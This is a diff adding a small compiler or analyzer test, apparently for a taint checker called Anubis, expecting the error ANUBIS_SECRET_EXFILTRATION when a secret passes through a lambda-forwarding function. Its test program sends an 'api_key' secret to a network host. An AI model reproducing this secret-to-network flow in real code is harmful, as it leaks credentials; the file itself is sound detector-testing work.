@@ -1,0 +1,6 @@
+// EXPECT: FAIL
+// ERROR_CONTAINS: ANUBIS_SECRET_EXFILTRATION
+// [12]: a param forwarded to the return through a local lambda (`fn fwd(x){ let g = || x; return g(); }`)
+// now summarizes to param->return-taint (body_param_returns descends via local_lambda_return_flow).
+fn fwd(x) { let g = || x; return g(); }
+fn main() uses(net.send) { send("host", 80, fwd(secret_source("api_key"))); }
